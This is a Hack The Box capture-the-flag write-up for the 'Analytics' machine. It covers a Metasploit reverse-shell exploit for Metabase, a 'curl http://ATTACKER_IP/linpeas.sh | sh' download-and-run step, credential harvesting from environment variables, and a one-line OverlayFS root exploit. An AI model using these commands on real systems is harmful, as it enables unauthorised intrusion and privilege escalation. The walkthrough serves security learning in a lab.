# Analytics

A writeup for the machine [Analytics](https://app.hackthebox.com/machines/Analytics) on Hack The Box.

<Image src={require("./banner.webp").default} height="500" />

## Footprinting

### Nmap scans

Firstly, we can start with a nmap scan.

We find two open ports with one web servers publicly accessible.

```bash
nmap -sS <HOST>
```

```
22 -> SSH
80 -> HTTP
```

<Image src={require("./nmap.webp").default} />

### Web server

To access the web server, we need to update the `/etc/hosts` file with the machine IP.

```
echo "10.10.11.233 analytics.htb" >> /etc/hosts
```

The web server is running a simple website with an home page and a login page.

<Image src={require("./homepage.webp").default} />

If we try to open the login page we are redirected to a new subdomain `data.analytics.htb`.

After updating again the hosts file, we can access the login page.

The login page is running a `Metabase` instance, an open-source web analytics platform.

<Image src={require("./login.webp").default} />

## User flag

### Exploiting Metabase

If we look to the source code of the login page, we can find some interesting information of the service.

One of the details contains the version of the `Metabase` instance.

<Image src={require("./metabase-version.webp").default} />

By searching online for this specifc version, we can find a RCE vulnerability and an Metasploit exploit for it.

[https://nvd.nist.gov/vuln/detail/CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

[https://packetstormsecurity.com/files/174091/Metabase-Remote-Code-Execution.html](https://packetstormsecurity.com/files/174091/Metabase-Remote-Code-Execution.html)

```bash
msfconsole
use exploit/multi/http/metabase_unauth_rce
set RHOSTS data.analytics.htb
set RPORT 80
set LHOST ATTACKER_IP
run
```

After running the exploit, we can get a reverse shell as the `metabase` user.

```bash
whoami
```

<Image src={require("./reverse-shell.webp").default} />

### From metabase to user

Once inside the machine, we discover that we are in a docker container.

We can still try to find some interesting information to escalate our privileges.

One possible way is to run `linpeas`.

```bash
# attacker
python3 -m http.server 80
# target
curl http://ATTACKER_IP/linpeas.sh | sh
```

Inside the environment variables, we can find a username and a password for the `metalytics` user.

```bash
echo $META_USER
echo $META_PASS
```

<Image src={require("./env-vars.webp").default} />

### Accessing with SSH

We can use the credentials that we found in the previous step to login via SSH.

```bash
ssh metalytics@TARGET_IP
```

After logging in, we can find the user flag inside the home directory.

```bash
cat user.txt
```

<Image src={require("./user-flag.webp").default} height="512" />

## Root flag

### Enumerating the environment

Now that we are inside the system, we can start to look for a way to escalate our privileges.

Nothing interesting is found in the home directory or in the user's history.

We can again use `linpeas` to find additional information.

As before, we can serve the script on our local machine and download it on the target.

Even in this case, nothing interesting is found.

### Exploiting CVE-2023-2640

Because we didn't find anything useful, we can start looking for possible vulnerabilities in the system.

To do so, we can start by checking the version of the operating system.

```bash
cat /etc/os-release
```

<Image src={require("./ubuntu-version.webp").default} />

By searching online we can see that this version is vulnerable to the OverlayFS vulnerability.

[https://nvd.nist.gov/vuln/detail/CVE-2023-2640](https://nvd.nist.gov/vuln/detail/CVE-2023-2640)

A simple exploit can allow us to run commands as root.

It is enough to execute the following command to get the root flag.

[https://github.com/luanoliveira350/GameOverlayFS/blob/main/gameoverlay.sh](https://github.com/luanoliveira350/GameOverlayFS/blob/main/gameoverlay.sh)

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("ls /root")'
```

Be careful, it should be run as a single command or run it through a script.

<Image src={require("./root.webp").default} />

